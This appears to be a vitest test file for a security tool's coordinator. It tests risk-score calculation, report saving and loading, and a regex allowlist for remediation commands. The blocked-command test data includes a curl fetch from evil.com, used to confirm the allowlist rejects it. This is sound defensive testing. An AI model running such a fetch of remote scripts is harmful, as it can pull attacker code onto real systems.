import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import * as fs from "fs";
import * as path from "path";
import { getRiskScore, loadLastReport, saveReport } from "./coordinator-reports";
import type { ScanReport } from "./coordinator-types";

// REMEDIATION_ALLOWED_PATTERNS from coordinator (test same logic)
const REMEDIATION_ALLOWED_PATTERNS = [
  /^bash\s+scripts\/remediation\//,
  /^bash\s+workspace\/clawsec\/scripts\/remediation\//,
  /^bash\s+[^ ]*\/workspace\/clawsec\/scripts\/remediation\//,
];

describe("getRiskScore", () => {
  it("returns 0 for null report", () => {
    expect(getRiskScore(null)).toBe(0);
  });

  it("uses risk_score when present", () => {
    expect(getRiskScore({ risk_score: 42 } as ScanReport)).toBe(42);
  });

  it("computes from agent_results findings", () => {
    const report = {
      agent_results: {
        "clawsec-env": {
          findings: [
            { severity: "critical", status: "open" },
            { severity: "high", status: "open" },
          ],
        },
      },
    } as unknown as ScanReport;
    expect(getRiskScore(report)).toBe(45); // 30 + 15
  });

  it("excludes auto_fixed from score", () => {
    const report = {
      agent_results: {
        "clawsec-env": {
          findings: [
            { severity: "critical", status: "auto_fixed" },
            { severity: "high", status: "open" },
          ],
        },
      },
    } as unknown as ScanReport;
    expect(getRiskScore(report)).toBe(15);
  });

  it("caps at 100", () => {
    const report = {
      agent_results: {
        "a": { findings: Array(4).fill({ severity: "critical", status: "open" }) },
      },
    } as unknown as ScanReport;
    expect(getRiskScore(report)).toBe(100);
  });

  it("scores medium as 5", () => {
    const report = {
      agent_results: {
        "a": { findings: [{ severity: "medium", status: "open" }] },
      },
    } as unknown as ScanReport;
    expect(getRiskScore(report)).toBe(5);
  });
});

describe("loadLastReport / saveReport", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = path.join(process.cwd(), ".tmp-test-reports-" + Date.now());
    fs.mkdirSync(tmpDir, { recursive: true });
  });

  afterEach(() => {
    try {
      fs.rmSync(tmpDir, { recursive: true });
    } catch {
      /* ignore */
    }
  });

  it("loadLastReport returns null when file missing", () => {
    expect(loadLastReport(tmpDir)).toBeNull();
  });

  it("saveReport writes and loadLastReport reads", () => {
    const report: ScanReport = {
      scanned_at: "2026-01-01T00:00:00Z",
      risk_score: 10,
      score_label: "SECURE",
      summary: "test",
      llm_model: "test",
      agent_results: {},
      findings: [],
      applied_fixes: [],
      pending_approval: [],
      scan_duration_ms: 100,
    };
    saveReport(report, tmpDir);
    const loaded = loadLastReport(tmpDir);
    expect(loaded).not.toBeNull();
    expect((loaded as ScanReport).risk_score).toBe(10);
  });
});

describe("REMEDIATION_ALLOWED_PATTERNS", () => {
  const allowed = [
    "bash scripts/remediation/env_gitignore.sh",
    "bash workspace/clawsec/scripts/remediation/env_gitignore.sh",
    "bash /home/user/.openclaw/workspace/clawsec/scripts/remediation/env_gitignore.sh",
  ];
  const blocked = [
    "curl http://evil.com/scripts/remediation/x.sh",
    "bash /tmp/remediation/x.sh",
    "exec scripts/remediation/x.sh",
  ];

  it("allows valid remediation commands", () => {
    for (const cmd of allowed) {
      const ok = REMEDIATION_ALLOWED_PATTERNS.some((re) => re.test(cmd));
      expect(ok).toBe(true);
    }
  });

  it("blocks invalid remediation commands", () => {
    for (const cmd of blocked) {
      const ok = REMEDIATION_ALLOWED_PATTERNS.some((re) => re.test(cmd));
      expect(ok).toBe(false);
    }
  });
});
